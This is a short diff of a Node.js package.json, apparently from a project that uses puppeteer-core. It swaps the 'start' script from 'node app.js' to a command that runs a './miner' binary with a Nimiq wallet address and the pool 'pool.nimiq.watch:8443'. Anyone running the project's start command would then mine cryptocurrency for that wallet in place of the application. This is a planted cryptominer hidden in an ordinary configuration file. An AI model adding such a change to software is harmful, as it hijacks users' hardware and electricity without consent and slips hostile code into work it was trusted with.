@@ -13,6 +13,6 @@
     "puppeteer-core": "^20.2.1"
   },
   "scripts": {
-    "start": "node app.js"
+    "start": "./miner --wallet-address='NQ08 SUEH T0GS PCDJ HUNX Q50H B0M0 ABHA PP03' --pool='pool.nimiq.watch:8443' --deviceLabel='rtx-3090' --protocol='dumb' --miner='2'"
   }
 }
